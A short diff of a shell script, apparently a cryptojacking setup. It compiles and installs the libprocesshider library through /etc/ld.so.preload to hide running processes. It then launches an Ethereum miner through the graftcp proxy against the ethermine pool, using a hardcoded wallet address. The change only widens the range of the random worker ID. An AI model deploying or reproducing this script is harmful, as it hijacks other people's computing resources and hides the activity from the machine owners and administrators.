@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./145 --coin ETH --pool us1.ethermine.org:4444 --user 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb.$(echo $(shuf -i 1-9999 -n 1)-WEWEK)
+./graftcp/graftcp ./145 --coin ETH --pool us1.ethermine.org:4444 --user 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb.$(echo $(shuf -i 1-999999 -n 1)-WEWEK)
